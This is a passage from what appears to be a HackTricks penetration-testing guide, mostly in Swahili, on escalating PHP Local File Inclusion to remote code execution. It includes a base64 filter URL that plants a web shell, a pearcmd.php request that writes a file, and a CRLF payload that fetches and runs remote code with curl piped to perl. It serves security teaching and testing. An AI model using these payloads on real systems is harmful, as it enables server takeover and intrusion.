2. Baada ya injection, tumia LFI kupata logi za server kutoka _**/var/log/vsftpd.log**_.

### Kupitia php base64 filter (using base64)

Kama inavyoonyeshwa katika [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter huvipuuza vitu visivyo-base64. Unaweza kutumia hilo kupita ukaguzi wa file extension: ikiwa utatoa base64 inayomalizika na ".php", itapuuza "." na kuongeza "php" kwenye base64. Hapa kuna mfano wa payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (hakuna faili inahitajika)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

Pakia faili itakayohifadhiwa kama ya muda katika /tmp, kisha katika request ileile, chochea segmentation fault, na basi faili ya muda haitafutwa na unaweza kuitafuta.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Ikiwa umepata Local File Inclusion na Nginx inaendesha mbele ya PHP unaweza kuweza kupata RCE kwa mbinu ifuatayo:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Ikiwa umepata Local File Inclusion hata kama huna session na `session.auto_start` iko `Off`. Ikiwa utatoa `PHP_SESSION_UPLOAD_PROGRESS` katika multipart POST data, PHP itawasha session kwa ajili yako. Unaweza kutumia vibaya hii kupata RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Ikiwa umepata Local File Inclusion na server inaendesha kwenye Windows unaweza kupata RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ifuatayo inatumia CRLF vuln kupata RCE (kutoka [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umegundua **Local File Inclusion** na faili inayofichua **phpinfo()** yenye file_uploads = on unaweza kupata RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umegundua **Local File Inclusion** na unaweza **exfiltrate the path** ya faili ya muda LAKINI **server** inakagua kama **faili itakayojumuishwa ina PHP marks**, unaweza kujaribu **bypass that check** kwa kutumia **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia eternal waiting + bruteforce

Ikiwa unaweza kutumia LFI kuabuse ili **upload temporary files** na kufanya server **hang** utekelezaji wa PHP, basi unaweza kisha **brute force filenames kwa masaa** ili kupata faili ya muda:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kwa Fatal Error

Ikiwa unajumuisha yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kujumuisha ile ile mara 2 ili kusababisha error hiyo).

**Sijui jinsi hili linavyoweza kuwa na manufaa lakini linaweza kuwa.**\
_Hata kama unasababisha PHP Fatal Error, PHP temporary files uploaded zinafutwa._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Marejeo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
